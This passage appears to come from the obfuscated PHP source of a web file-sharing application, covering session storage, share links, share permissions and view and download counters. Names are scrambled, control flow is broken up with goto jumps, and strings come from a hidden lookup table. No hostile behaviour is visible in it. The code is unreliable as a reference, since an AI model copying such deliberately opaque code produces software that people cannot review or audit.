$aˆ½ØòéÊ [1463] . $aù»•‚½¡»); goto eÙ©…ÑˆÂ†; eÙ©…ÑˆÂ†: return !0; goto bš‡¥¹„ê§; e›–£ÃºÔ’: $aˆ½ØòéÊ  =& $_SERVER[‡’¶øåüç˜]; $bÄ´‚Ê×‘è = self::valueGet($B£÷Š¨ãŒ¸); if (!$bÄ´‚Ê×‘è) { return !1; } goto eùŠçäˆß›; bš‡¥¹„ê§: } public static function valueGet($e½¸“à£‰ = false) { $CŸÔÚğÔ =& $_SERVER[‡’¶øåüç˜]; if ($e½¸“à£‰) { $d·ğ¾Š©Õ = Model($CŸÔÚğÔ[411])->where(array($CŸÔÚğÔ[89] => $e½¸“à£‰, $CŸÔÚğÔ[29] => $CŸÔÚğÔ[1464]))->find(); return $d·ğ¾Š©Õ ? json_decode($d·ğ¾Š©Õ[$CŸÔÚğÔ[363]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($E‡æÛùÙÙ = false) { goto AˆÆ²áßÖã; cÓ—†Š¬”â: return $A÷¾Ş»ëé°; goto eº¬ã ô§Ä; AˆÆ²áßÖã: $fŞ—©Áİ—‚ =& $_SERVER[‡’¶øåüç˜]; $f¸æö©Á‚‘ = array($fŞ—©Áİ—‚[29] => $fŞ—©Áİ—‚[1464]); if ($E‡æÛùÙÙ) { $f¸æö©Á‚‘[$fŞ—©Áİ—‚[1443]] = $E‡æÛùÙÙ; } goto fŒ‰ç·Š¢’; fŒ‰ç·Š¢’: $A÷¾Ş»ëé° = Model($fŞ—©Áİ—‚[411])->where($f¸æö©Á‚‘)->select(); $A÷¾Ş»ëé° = $A÷¾Ş»ëé° ? $A÷¾Ş»ëé° : array(); foreach ($A÷¾Ş»ëé° as $D£¶öì => $dÆÓó‘Õî) { $A÷¾Ş»ëé°[$D£¶öì] = json_decode($dÆÓó‘Õî[$fŞ—©Áİ—‚[363]], !0); } goto cÓ—†Š¬”â; eº¬ã ô§Ä: } public static function valueSet($B‹ËĞÓŒ‘Í, $cÇ¬–˜ŒÄ½) { goto cÊƒ¦°†£‡; E§Ùù«Œòã: if (!$AÍ”±šŠƒ) { ob_start(); var_dump($cÇ¬–˜ŒÄ½); $CšÏ­â·¿‹ = ob_get_clean(); self::log($c·¨³ƒµù¦[1465] . json_encode_force($CšÏ­â·¿‹)); } if (!$B‹ËĞÓŒ‘Í || !$cÇ¬–˜ŒÄ½[$c·¨³ƒµù¦[371]]) { return !1; } $cê‰Åé¾Æà = array($c·¨³ƒµù¦[29] => $c·¨³ƒµù¦[1464], $c·¨³ƒµù¦[1443] => USER_ID, $c·¨³ƒµù¦[89] => $B‹ËĞÓŒ‘Í, $c·¨³ƒµù¦[363] => $AÍ”±šŠƒ); goto DÄÀ¢è”„; DÄÀ¢è”„: Model($c·¨³ƒµù¦[411])->add($cê‰Åé¾Æà, array(), !0); goto bÂ¯ù¤‹ Ï; cÊƒ¦°†£‡: $c·¨³ƒµù¦ =& $_SERVER[‡’¶øåüç˜]; if (!$cÇ¬–˜ŒÄ½) { return Model($c·¨³ƒµù¦[411])->where(array($c·¨³ƒµù¦[89] => $B‹ËĞÓŒ‘Í, $c·¨³ƒµù¦[29] => $c·¨³ƒµù¦[1464]))->delete(); } $AÍ”±šŠƒ = json_encode($cÇ¬–˜ŒÄ½); goto E§Ùù«Œòã; bÂ¯ù¤‹ Ï: } public static function log($f—Œˆ§¢‚à) { write_log($f—Œˆ§¢‚à, $_SERVER[‡’¶øåüç˜][1466]); } } goto a÷šƒ¥…é¿; e‡§°½”×œ: class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\155\x5f\163\145\x73\x73\151\x6f\x6e"; public function get($CàèøˆÏ) { $Fò‘ï†ô =& $_SERVER[‡’¶øåüç˜]; $A¥Ú÷•¢“‚ = $this->where(array($Fò‘ï†ô[2230] => $CàèøˆÏ))->find(); if (!is_array($A¥Ú÷•¢“‚)) { return !1; } return $A¥Ú÷•¢“‚[$Fò‘ï†ô[698]]; } public function set($D°²à¤¿­, $F›êí÷¶Ûğ, $f„Ö“‡Şñ… = 3600) { $Cªìˆ‰Çö… =& $_SERVER[‡’¶øåüç˜]; $cÚ§ó‚ÍÌ² = array($Cªìˆ‰Çö…[2230] => $D°²à¤¿­, $Cªìˆ‰Çö…[2143] => $F›êí÷¶Ûğ, $Cªìˆ‰Çö…[2231] => $f„Ö“‡Şñ… + time()); if (Session::get($Cªìˆ‰Çö…[2232])) { $cÚ§ó‚ÍÌ²[$Cªìˆ‰Çö…[1443]] = Session::get($Cªìˆ‰Çö…[2232]); } else { $cÚ§ó‚ÍÌ²[$Cªìˆ‰Çö…[1443]] = 0; } if ($this->get($D°²à¤¿­)) { return $this->where(array($Cªìˆ‰Çö…[2230] => $D°²à¤¿­))->save($cÚ§ó‚ÍÌ²); } else { return $this->add($cÚ§ó‚ÍÌ², array(), !0); } } public function remove($cÉ°¶Ìñêä) { return $this->where(array($_SERVER[‡’¶øåüç˜][2230] => $cÉ°¶Ìñêä))->delete(); } public function clearTimeout() { return $this->where($_SERVER[‡’¶øåüç˜][2233] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\x72\145"; protected $dataAuto = array(array("\155\157\x64\x69\146\x79\124\151\155\145", "\164\151\155\x65", "\x69\x6e\163\145\162\164\54\x75\x70\144\141\164\145", "\146\x75\x6e\x63\164\x69\157\156"), array("\x63\x72\145\x61\x74\145\x54\151\x6d\x65", "\164\151\x6d\x65", "\151\156\163\145\x72\x74", "\146\165\156\143\164\151\x6f\x6e"), array("\x6f\160\x74\151\x6f\156\163", '', "\x69\156\x73\x65\162\164\54\x75\x70\144\x61\x74\145\x2c\x73\x65\154\145\143\x74", "\152\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($E·– ¯œÈÎ) { $dç¾±œèŒÁ =& $_SERVER[‡’¶øåüç˜]; $fŠäšÎÀæí = isset($E·– ¯œÈÎ[0]) ? $E·– ¯œÈÎ[0] : !1; return array($dç¾±œèŒÁ[2234] => array(USER_ID, $dç¾±œèŒÁ[2235]), $dç¾±œèŒÁ[2183] => array($fŠäšÎÀæí, $dç¾±œèŒÁ[2236])); } protected function listSimple() { $D§ÓœÅÑÏ¤ = array($_SERVER[‡’¶øåüç˜][1443] => USER_ID); $c‡ï¹„öË‹ = $this->field($this->fieldList)->where($D§ÓœÅÑÏ¤)->select(); return $c‡ï¹„öË‹ ? $c‡ï¹„öË‹ : array(); } protected function getInfo($dºÓªŞ½Ñ, $d®óñ’‰£Ø = false) { $Dë´ßğ‡Æ =& $_SERVER[‡’¶øåüç˜]; if ($d®óñ’‰£Ø) { return $this->_getShareInfo(array($Dë´ßğ‡Æ[452] => $dºÓªŞ½Ñ)); } $bÒ¢Ï·£›¹ = $this->cacheFunctionGet($Dë´ßğ‡Æ[2237], $dºÓªŞ½Ñ); return $bÒ¢Ï·£›¹; } public function getInfoByHash($EÆòğÆ¤½“) { return $this->_getShareInfo(array($_SERVER[‡’¶øåüç˜][454] => $EÆòğÆ¤½“)); } public function getInfoByPath($C¾¡¥‰°ïğ) { $aô¤ïõ´µâ =& $_SERVER[‡’¶øåüç˜]; $a£ö…Î–Ş¬ = array($aô¤ïõ´µâ[1443] => USER_ID, $aô¤ïõ´µâ[381] => $C¾¡¥‰°ïğ); return $this->_getShareInfo($a£ö…Î–Ş¬); } public function getInfoBySourcePath($e‚ÍÙÉƒ¬ì) { $Eä¨‡„ß›¸ =& $_SERVER[‡’¶øåüç˜]; $B¶ë‡ÏÏ = array($Eä¨‡„ß›¸[1443] => USER_ID, $Eä¨‡„ß›¸[1027] => $e‚ÍÙÉƒ¬ì); return $this->_getShareInfo($B¶ë‡ÏÏ); } private function _getShareInfo($dæ¾‹ö“ÙÍ) { goto aï¥Ö‹ºÙÉ; aï¥Ö‹ºÙÉ: $DèíÁÙöãã =& $_SERVER[‡’¶øåüç˜]; $cï¢Ë“ªØ = $this->where($dæ¾‹ö“ÙÍ)->find(); if (!$cï¢Ë“ªØ) { return !1; } goto dÔİ«¿š÷£; a„æÖÙèĞ: if ($cï¢Ë“ªØ[$DèíÁÙöãã[381]] == $DèíÁÙöãã[481]) { $cï¢Ë“ªØ[$DèíÁÙöãã[403]] = IO::info($cï¢Ë“ªØ[$DèíÁÙöãã[1027]]); } else { $cï¢Ë“ªØ[$DèíÁÙöãã[403]] = Model($DèíÁÙöãã[1124])->pathInfo($cï¢Ë“ªØ[$DèíÁÙöãã[381]]); } $cï¢Ë“ªØ[$DèíÁÙöãã[2239]] = $C¶Ôãğ’Ë²; return $cï¢Ë“ªØ; goto F›´ÀÛ‚’; dÔİ«¿š÷£: $dæ¾‹ö“ÙÍ = array($DèíÁÙöãã[452] => $cï¢Ë“ªØ[$DèíÁÙöãã[452]]); $BÊŠ÷Ğ‡×© = $DèíÁÙöãã[2238]; $C¶Ôãğ’Ë² = Model($DèíÁÙöãã[549])->order($DèíÁÙöãã[371])->field($BÊŠ÷Ğ‡×©)->where($dæ¾‹ö“ÙÍ)->select(); goto a„æÖÙèĞ; F›´ÀÛ‚’: } protected function getInfoAuth($C¿±—ôâŒ›) { $aµ¨èÓ¿ =& $_SERVER[‡’¶øåüç˜]; $D‚Åçàõ« = $this->getInfo($C¿±—ôâŒ›); $D‚Åçàõ«[$aµ¨èÓ¿[388]] = Model($aµ¨èÓ¿[467])->authMake($D‚Åçàõ«[$aµ¨èÓ¿[2239]]); return $D‚Åçàõ«; } protected function listData($F†åÓ‘ğÉÚ = null, $BŠ²¤»§·Ä = 300) { $c˜îÖ…²Õ =& $_SERVER[‡’¶øåüç˜]; $C•‚ÌŠ¶®„ = array(array($c˜îÖ…²Õ[457] => array($c˜îÖ…²Õ[929], 0), $c˜îÖ…²Õ[459] => array($c˜îÖ…²Õ[929], 0), $c˜îÖ…²Õ[2240] => $c˜îÖ…²Õ[2197])); if ($F†åÓ‘ğÉÚ == $c˜îÖ…²Õ[1878]) { $C•‚ÌŠ¶®„ = array($c˜îÖ…²Õ[457] => 1); } else { if ($F†åÓ‘ğÉÚ == $c˜îÖ…²Õ[1012]) { $C•‚ÌŠ¶®„ = array($c˜îÖ…²Õ[459] => 1); } } $C•‚ÌŠ¶®„[$c˜îÖ…²Õ[1443]] = USER_ID; $d‘º‚µ‹‰£ = $this->where($C•‚ÌŠ¶®„)->selectPage($BŠ²¤»§·Ä); return $d‘º‚µ‹‰£; } protected function listToMe($b­ˆ†ñ£Š = 300) { goto F“ ëƒ‡ëØ; d ˜ÍÅÏ´¨: $d•í¥†·ö = $this->field($EŸ»ôÎÃ“ê)->where($d¤Çò®ŠÊÌ)->select(); foreach ($d•í¥†·ö as $C¢‘Ù¿Š‰› => &$AÎÛ©…¤Ü÷) { $AÎÛ©…¤Ü÷[$D«„öº×®[2239]] = $Añâ„×Ü¿[$AÎÛ©…¤Ü÷[$D«„öº×®[452]]]; } unset($AÎÛ©…¤Ü÷); goto cóí¤íåßñ; cóí¤íåßñ: $FªËáà³À¿ = array($D«„öº×®[2243] => $d•í¥†·ö, $D«„öº×®[2244] => $eÂÊºæ‚‡¿[$D«„öº×®[355]]); return $FªËáà³À¿; goto B™´¦äà¹‡; F“ ëƒ‡ëØ: $D«„öº×® =& $_SERVER[‡’¶øåüç˜]; $e¹Ğå®¨÷Â = Model($D«„öº×®[2241])->userGroupParents(USER_ID); $d¤Çò®ŠÊÌ = array($D«„öº×®[534] => SourceModel::TYPE_USER, $D«„öº×®[469] => USER_ID); goto AòáÊÙØ”©; f«šÒÙŒ†“: if (!$Añâ„×Ü¿) { return $eÂÊºæ‚‡¿; } $EŸ»ôÎÃ“ê = $D«„öº×®[2242]; $d¤Çò®ŠÊÌ = array($D«„öº×®[452] => array($D«„öº×®[396], array_keys($Añâ„×Ü¿))); goto d ˜ÍÅÏ´¨; AòáÊÙØ”©: if ($e¹Ğå®¨÷Â) { $d¤Çò®ŠÊÌ = array(array($D«„öº×®[534] => SourceModel::TYPE_USER, $D«„öº×®[469] => USER_ID), array($D«„öº×®[534] => SourceModel::TYPE_GROUP, $D«„öº×®[469] => array($D«„öº×®[7], $e¹Ğå®¨÷Â)), $D«„öº×®[2240] => $D«„öº×®[2197]); } $eÂÊºæ‚‡¿ = Model($D«„öº×®[549])->where($d¤Çò®ŠÊÌ)->selectPage($b­ˆ†ñ£Š); $Añâ„×Ü¿ = array_to_keyvalue_group($eÂÊºæ‚‡¿[$D«„öº×®[358]], $D«„öº×®[452]); goto f«šÒÙŒ†“; B™´¦äà¹‡: } protected function shareAdd($AÛ„ÂœèÏæ, $E“»à¹¡°’) { $CèÁì¢ÁÃô =& $_SERVER[‡’¶øåüç˜]; $a˜†ç‚Ä÷Ø = $this->_addShareData($AÛ„ÂœèÏæ, $E“»à¹¡°’); if (!empty($E“»à¹¡°’[$CèÁì¢ÁÃô[2245]])) { $this->_shareAuthSet($a˜†ç‚Ä÷Ø, $E“»à¹¡°’[$CèÁì¢ÁÃô[2245]]); } $this->shareEventAdd($AÛ„ÂœèÏæ, $E“»à¹¡°’, $CèÁì¢ÁÃô[1015]); return $a˜†ç‚Ä÷Ø; } private function shareEventAdd($C‹ïÁ·Ç, $Eñ×¦˜öÆ, $bô¶š¿¨Ğ = "\141\x64\144") { goto d‚˜ˆˆ‹ó; bÈŞ¢„ªĞ¾: return; goto b†»®çø; F±ˆØùğ: $cºî–ò÷ = $E¡ËËÅ™½²[2248]; if ($FÀÔÒ¼´ÉØ[$E¡ËËÅ™½²[457]] == $E¡ËËÅ™½²[481] && $Eñ×¦˜öÆ[$E¡ËËÅ™½²[457]] == $E¡ËËÅ™½²[83]) { $cºî–ò÷ = $E¡ËËÅ™½²[2246]; } if ($FÀÔÒ¼´ÉØ[$E¡ËËÅ™½²[457]] == $E¡ËËÅ™½²[83] && $Eñ×¦˜öÆ[$E¡ËËÅ™½²[457]] == $E¡ËËÅ™½²[481]) { $cºî–ò÷ = $E¡ËËÅ™½²[2249]; } goto eœ¡ÀØºÇ; eœ¡ÀØºÇ: if ($FÀÔÒ¼´ÉØ[$E¡ËËÅ™½²[459]] == $E¡ËËÅ™½²[481] && $Eñ×¦˜öÆ[$E¡ËËÅ™½²[459]] == $E¡ËËÅ™½²[83]) { $cºî–ò÷ = $E¡ËËÅ™½²[2247]; } if ($FÀÔÒ¼´ÉØ[$E¡ËËÅ™½²[459]] == $E¡ËËÅ™½²[83] && $Eñ×¦˜öÆ[$E¡ËËÅ™½²[459]] == $E¡ËËÅ™½²[481]) { $cºî–ò÷ = $E¡ËËÅ™½²[2250]; } Model($E¡ËËÅ™½²[518])->eventShare($C‹ïÁ·Ç, $cºî–ò÷); goto bÈŞ¢„ªĞ¾; d‚˜ˆˆ‹ó: $E¡ËËÅ™½² =& $_SERVER[‡’¶øåüç˜]; if ($bô¶š¿¨Ğ == $E¡ËËÅ™½²[1015]) { if ($Eñ×¦˜öÆ[$E¡ËËÅ™½²[457]] == $E¡ËËÅ™½²[83]) { Model($E¡ËËÅ™½²[518])->eventShare($C‹ïÁ·Ç, $E¡ËËÅ™½²[2246]); } if ($Eñ×¦˜öÆ[$E¡ËËÅ™½²[459]] == $E¡ËËÅ™½²[83]) { Model($E¡ËËÅ™½²[518])->eventShare($C‹ïÁ·Ç, $E¡ËËÅ™½²[2247]); } return; } $FÀÔÒ¼´ÉØ = $this->getInfoByPath($C‹ïÁ·Ç); goto F±ˆØùğ; b†»®çø: } private function _addShareData($D–’ä†Š¹‚, $e¯”é±È›– = array()) { goto eÆÛäò±Ğ; e¨ùÏËõˆÕ: if ($AµÙÄƒí¶ = $this->where($fŠİâ…²ã©)->find()) { return $AµÙÄƒí¶[$aï…Ëîò†Š[452]]; } if ($D–’ä†Š¹‚ == 0) { $D³èŸÂÉ ¡ = array($aï…Ëîò†Š[28] => get_path_this($e¯”é±È›–[$aï…Ëîò†Š[75]])); } else { $D³èŸÂÉ ¡ = Model($aï…Ëîò†Š[758])->sourceInfo($D–’ä†Š¹‚); if (!$D³èŸÂÉ ¡) { return !1; } } if (!$e¯”é±È›–[$aï…Ëîò†Š[1348]]) { $e¯”é±È›–[$aï…Ëîò†Š[1348]] = $D³èŸÂÉ ¡[$aï…Ëîò†Š[28]]; } goto cãçïÆ¹¯±; cãçïÆ¹¯±: $Bå‚æŸì”Ÿ = array($aï…Ëîò†Š[1434] => USER_ID, $aï…Ëîò†Š[395] => $D–’ä†Š¹‚, $aï…Ëîò†Š[1348] => $aï…Ëîò†Š[33], $aï…Ëîò†Š[457] => 0, $aï…Ëîò†Š[459] => 0, $aï…Ëîò†Š[1027] => $aï…Ëîò†Š[33], $aï…Ëîò†Š[299] => $aï…Ëîò†Š[33], $aï…Ëîò†Š[807] => $aï…Ëîò†Š[33], $aï…Ëîò†Š[2252] => 0, $aï…Ëîò†Š[2253] => 0, $aï…Ëîò†Š[460] => 0, $aï…Ëîò†Š[461] => $aï…Ëîò†Š[33], $aï…Ëîò†Š[454] => $aï…Ëîò†Š[33]); $D¡•ÇÃ·¿‚ = explode($aï…Ëîò†Š[47], $aï…Ëîò†Š[2254]); foreach ($D¡•ÇÃ·¿‚ as $dÈø ù‹Œ·) { if (!isset($e¯”é±È›–[$dÈø ù‹Œ·])) { continue; } $Bå‚æŸì”Ÿ[$dÈø ù‹Œ·] = $e¯”é±È›–[$dÈø ù‹Œ·]; } goto aÖù–×¸¢; B­Œ¿ïÂù: return $eğ§Çç®»; goto D‘¬‰‡’„è; aÖù–×¸¢: $eğ§Çç®» = $this->add($Bå‚æŸì”Ÿ); $eÕİµáĞ— = array($aï…Ëîò†Š[454] => short_id($eğ§Çç®»)); $this->where(array($aï…Ëîò†Š[451] => $eğ§Çç®»))->save($eÕİµáĞ—); goto B­Œ¿ïÂù; eÆÛäò±Ğ: $aï…Ëîò†Š =& $_SERVER[‡’¶øåüç˜]; $fŠİâ…²ã© = array($aï…Ëîò†Š[395] => $D–’ä†Š¹‚, $aï…Ëîò†Š[1434] => USER_ID); if ($D–’ä†Š¹‚ == 0) { $fŠİâ…²ã© = array($aï…Ëîò†Š[2251] => $e¯”é±È›–[$aï…Ëîò†Š[1027]], $aï…Ëîò†Š[1434] => USER_ID); } goto e¨ùÏËõˆÕ; D‘¬‰‡’„è: } private function _shareAuthSet($AöÜ°÷×, $BÒ”°îç) { goto e‡Îœò¥·¹; CËéáä‹‚Ğ: $c„ˆõÉù­->where(array($d‘Ÿßè…çÖ[452] => $AöÜ°÷×))->delete(); $cƒ‰á‘Üµ = array(); foreach ($BÒ”°îç as $D««”’óèî) { $F¨†Ï¦ø³ = SourceModel::TYPE_USER; if ($D««”’óèî[$d‘Ÿßè…çÖ[383]] == SourceModel::TYPE_GROUP) { $F¨†Ï¦ø³ = SourceModel::TYPE_GROUP; } $Cé•ºÑÌÛÖ = array($d‘Ÿßè…çÖ[452] => $AöÜ°÷×, $d‘Ÿßè…çÖ[383] => $F¨†Ï¦ø³, $d‘Ÿßè…çÖ[469] => intval($D««”’óèî[$d‘Ÿßè…çÖ[469]]), $d‘Ÿßè…çÖ[2256] => 0, $d‘Ÿßè…çÖ[2257] => -1); if ($D««”’óèî[$d‘Ÿßè…çÖ[2256]]) { $Cé•ºÑÌÛÖ[$d‘Ÿßè…çÖ[2256]] = $D««”’óèî[$d‘Ÿßè…çÖ[2256]]; } else { if ($D««”’óèî[$d‘Ÿßè…çÖ[2257]]) { $Cé•ºÑÌÛÖ[$d‘Ÿßè…çÖ[2257]] = $D««”’óèî[$d‘Ÿßè…çÖ[2257]]; } } $cƒ‰á‘Üµ[] = $Cé•ºÑÌÛÖ; } goto B¿è°Œ­ ; B¿è°Œ­ : return $c„ˆõÉù­->addAll($cƒ‰á‘Üµ, array(), !0); goto eÖ’æ²©Ûç; e‡Îœò¥·¹: $d‘Ÿßè…çÖ =& $_SERVER[‡’¶øåüç˜]; if (!is_array($BÒ”°îç)) { return !1; } $c„ˆõÉù­ = Model($d‘Ÿßè…çÖ[2255]); goto CËéáä‹‚Ğ; eÖ’æ²©Ûç: } public function numViewAdd($dÀ—Çö‚’Á) { $f¬à˜ŞÚ’• =& $_SERVER[‡’¶øåüç˜]; $dã¾†´ôÄÂ = array($f¬à˜ŞÚ’•[451] => $dÀ—Çö‚’Á); $this->where($dã¾†´ôÄÂ)->setAdd($f¬à˜ŞÚ’•[2252]); } public function numDownloadAdd($Eé½ÀÚ…ƒÙ) { $f¶ñ¹ÜÙˆâ =& $_SERVER[‡’¶øåüç˜]; $F­ÔÅäë’‚ = array($f¶ñ¹ÜÙˆâ[451] => $Eé½ÀÚ…ƒÙ); $this->where($F­ÔÅäë’‚)->setAdd($f¶ñ¹ÜÙˆâ[2253]); } protected function shareEdit($bƒ¶¯œßÃ, $Cõ·İÒŒ) { goto Eñì»¿Ô¸‡; e‹ÚÍØ…»ô: if (isset($Cõ·İÒŒ[$Eè×ä¬®Ú[2245]])) { $this->_shareAuthSet($bƒ¶¯œßÃ, $Cõ·İÒŒ[$Eè×ä¬®Ú[2245]]); } return !0; goto e…µ°„ğÒ™; Eñì»¿Ô¸‡: $Eè×ä¬®Ú =& $_SERVER[‡’¶øåüç˜]; $aªÏ™—ŒÓ× = $this->getInfo($bƒ¶¯œßÃ); if (!$aªÏ™—ŒÓ×) { return !1; } goto bâˆëºÌÆ; dªÈŞ´ÕâÜ: foreach ($Cñö†Õª˜š as $Cã¶ ­‹î‡) { if (!array_key_exists($Cã¶ ­‹î‡, $Cõ·İÒŒ)) { continue; } $DŞá–“ê¾Á[$Cã¶ ­‹î‡] = $Cõ·İÒŒ[$Cã¶ ­‹î‡]; } $this->shareEventAdd($aªÏ™—ŒÓ×[$Eè×ä¬®Ú[381]], $Cõ·İÒŒ, $Eè×ä¬®Ú[2079]); $this->where(array($Eè×ä¬®Ú[451] => $bƒ¶¯œßÃ))->save($DŞá–“ê¾Á); goto e‹ÚÍØ…»ô; bâˆëºÌÆ: $this->_checkLinkShare($Cõ·İÒŒ, $aªÏ™—ŒÓ×); $DŞá–“ê¾Á = array(); $Cñö†Õª˜š = explode($Eè×ä¬®Ú[47], $Eè×ä¬®Ú[2258]); goto dªÈŞ´ÕâÜ; e…µ°„ğÒ™: } private function _checkLinkShare($c¡œ³©ï½ê, $F  ÷Š¤Ø) { goto Dëğ‘©ãİ; fƒÏö¸‹Ô©: $E‡ŠâõÍ¥ = $this->shareFileMeta($c¹–·¹ó¦Ø[$f–ÄîÇŠßØ[431]]); if (isset($E‡ŠâõÍ¥[$f–ÄîÇŠßØ[363]]) && $E‡ŠâõÍ¥[$f–ÄîÇŠßØ[363]] == $f–ÄîÇŠßØ[83]) { show_json(LNG($f–ÄîÇŠßØ[2261]), !1); } goto d£ÀËÚŞ‘ö; Dëğ‘©ãİ: $f–ÄîÇŠßØ =& $_SERVER[‡’¶øåüç˜]; if ($c¡œ³©ï½ê[$f–ÄîÇŠßØ[457]] != $f–ÄîÇŠßØ[83]) { return; } $DØÁĞÖòÏ¹ = $F  ÷Š¤Ø[$f–ÄîÇŠßØ[403]][$f–ÄîÇŠßØ[381]]; goto a‹…‘ÂßÕÌ; a‹…‘ÂßÕÌ: if ($F  ÷Š¤Ø[$f–ÄîÇŠßØ[403]][$f–ÄîÇŠßØ[29]] != $f–ÄîÇŠßØ[171]) { $dê•É÷àË¿ = $this->_folderReport($DØÁĞÖòÏ¹); if (!$dê•É÷àË¿) { return; } show_json(LNG($f–ÄîÇŠßØ[2259]) . $f–ÄîÇŠßØ[2260] . $dê•É÷àË¿, !1); } $c¹–·¹ó¦Ø = Model($f–ÄîÇŠßØ[758])->fileInfoGet($F  ÷Š¤Ø[$f–ÄîÇŠßØ[403]][$f–ÄîÇŠßØ[381]]); if (!$c¹–·¹ó¦Ø) { return; } goto fƒÏö¸‹Ô©; d£ÀËÚŞ‘ö: } private function _folderReport($CáƒµÔÓÊÉ) { goto dÚœ’¶Å¯ò; aİÍÚ‚ĞŒÖ: $eˆÚ¹èİ— = substr($c¼Ó‡ í[$aÆè×ˆÌï‡[472]], strpos($c¼Ó‡ í[$aÆè×ˆÌï‡[472]], $e©šÅÀĞÄÎ)); $bğ»Š­³· = array($aÆè×ˆÌï‡[381] => array($aÆè×ˆÌï‡[7], trim($eˆÚ¹èİ—, $aÆè×ˆÌï‡[47]))); $EŞÆÊçËŸ’ = Model($aÆè×ˆÌï‡[758])->where($bğ»Š­³·)->field($aÆè×ˆÌï‡[28])->select(); goto D´ÔÆ™´˜¯; Bñ¿‰ä½Ã: $bğ»Š­³· = array($aÆè×ˆÌï‡[431] => array($aÆè×ˆÌï‡[7], $F‹ÃÃ¿•¼¹), $aÆè×ˆÌï‡[472] => array($aÆè×ˆÌï‡[757], "\45{$e©šÅÀĞÄÎ}\45"), $aÆè×ˆÌï‡[409] => 0); $c¼Ó‡ í = Model($aÆè×ˆÌï‡[758])->where($bğ»Š­³·)->field($aÆè×ˆÌï‡[2263])->find(); if (!$c¼Ó‡ í) { return !1; } goto aİÍÚ‚ĞŒÖ; aĞí£‡ø²˜: if (!$F‹ÃÃ¿•¼¹) { return !1; } $F‹ÃÃ¿•¼¹ = array_to_keyvalue($F‹ÃÃ¿•¼¹, $aÆè×ˆÌï‡[33], $aÆè×ˆÌï‡[431]); $e©šÅÀĞÄÎ = $aÆè×ˆÌï‡[47] . $CáƒµÔÓÊÉ . $aÆè×ˆÌï‡[47]; goto Bñ¿‰ä½Ã; dÚœ’¶Å¯ò: $aÆè×ˆÌï‡ =& $_SERVER[‡’¶øåüç˜]; $bğ»Š­³· = array($aÆè×ˆÌï‡[431] => array($aÆè×ˆÌï‡[929], 0), $aÆè×ˆÌï‡[695] => 3); $F‹ÃÃ¿•¼¹ = Model($aÆè×ˆÌï‡[2262])->where($bğ»Š­³·)->field($aÆè×ˆÌï‡[431])->select(); goto aĞí£‡ø²˜; D´ÔÆ™´˜¯: $AÚĞ‹¡¡ = array_to_keyvalue($EŞÆÊçËŸ’, $aÆè×ˆÌï‡[33], $aÆè×ˆÌï‡[28]); $AÚĞ‹¡¡[] = $c¼Ó‡ í[$aÆè×ˆÌï‡[28]]; return implode($aÆè×ˆÌï‡[8], $AÚĞ‹¡¡); goto bÉÚÎ¦é–; bÉÚÎ¦é–: } protected function remove($DõÛ‹îïÃÆ) { goto Fò°ƒš›¥Š; fîÊ¨ƒ¡Åš: for ($B­Ò„¸îÄ¬ = 0; $B­Ò„¸îÄ¬ < count($Eô‹‘ËÍ½í); $B­Ò„¸îÄ¬++) { $FÉÇ¨íèØ = $this->getInfo($Eô‹‘ËÍ½í[$B­Ò„¸îÄ¬]); if ($FÉÇ¨íèØ[$dé¢“ìÃ[459]] == $dé¢“ìÃ[83]) { Model($dé¢“ìÃ[518])->eventShare($FÉÇ¨íèØ[$dé¢“ìÃ[381]], $dé¢“ìÃ[2250]); } if ($FÉÇ¨íèØ[$dé¢“ìÃ[457]] == $dé¢“ìÃ[83]) { Model($dé¢“ìÃ[518])->eventShare($FÉÇ¨íèØ[$dé¢“ìÃ[381]], $dé¢“ìÃ[2249]); } } return $Dö²œä²èö; goto DøğÜóÜ§ª; Fò°ƒš›¥Š: $dé¢“ìÃ =& $_SERVER[‡’¶øåüç˜]; if (is_array($DõÛ‹îïÃÆ)) { $DõÛ‹îïÃÆ = array($dé¢“ìÃ[7], $DõÛ‹îïÃÆ); } $däÉÆÊ£Ø™ = array($dé¢“ìÃ[452] => $DõÛ‹îïÃÆ); goto a‹‘»Ì‡Õ×; a‹‘»Ì‡Õ×: $Dö²œä²èö = $this->where($däÉÆÊ£Ø™)->delete(); if ($Dö²œä²èö) { Model($dé¢“ìÃ[549])->where(array($dé¢“ìÃ[452] => $DõÛ‹îïÃÆ))->delete(); } $Eô‹‘ËÍ½í = is_array($DõÛ‹îïÃÆ) ? $DõÛ‹îïÃÆ[1] : array($DõÛ‹îïÃÆ); goto fîÊ¨ƒ¡Åš; DøğÜóÜ§ª: } protected function removeBySource($Bèö±Œ¯Æ) { goto BöºŞİÆÅˆ; BöºŞİÆÅˆ: $B†õÇÙŸ¸ =& $_SERVER[‡’¶øåüç˜]; $DøÌÀ˜†µ¸ = array($B†õÇÙŸ¸[395] => array($B†õÇÙŸ¸[396], $Bèö±Œ¯Æ)); $fãçôÅ˜– = $this->field($B†õÇÙŸ¸[452])->where($DøÌÀ˜†µ¸)->select(); goto DÇÅÊ‚Œì; DÇÅÊ‚Œì: $fãçôÅ˜– = array_to_keyvalue($fãçôÅ˜–, $B†õÇÙŸ¸[33], $B†õÇÙŸ¸[452]); if (!$fãçôÅ˜–) { return; } $DøÌÀ˜†µ¸ = array($B†õÇÙŸ¸[451] => array($B†õÇÙŸ¸[396], $fãçôÅ˜–)); goto d¤ÓÇ£ğ¶; d¤ÓÇ£ğ¶: $this->where($DøÌÀ˜†µ¸)->delete(); Model($B†õÇÙŸ¸[549])->where($DøÌÀ˜†µ¸)->delete(); goto EßÙÖøó; EßÙÖøó: } public function listAll($aëŠ¼¿¤¼Œ) { goto D—Æßª‚ç; cŒäºòÚÑ: return $D§òÅ›„ù¿; goto Dç—¦Ë¥; D—Æßª‚ç: $D”¹ğä¬Íá =& $_SERVER[‡’¶øåüç˜]; $C£§ˆ¢í¤Ø = array(); if ($aëŠ¼¿¤¼Œ[$D”¹ğä¬Íá[1443]]) { $C£§ˆ¢í¤Ø[$D”¹ğä¬Íá[1443]] = $aëŠ¼¿¤¼Œ[$D”¹ğä¬Íá[1443]]; } goto AóäŠ­‚İ; AóäŠ­‚İ: if ($aëŠ¼¿¤¼Œ[$D”¹ğä¬Íá[708]]) { $A ‰ ‘ÁùÃ = $aëŠ¼¿¤¼Œ[$D”¹ğä¬Íá[460]] ? 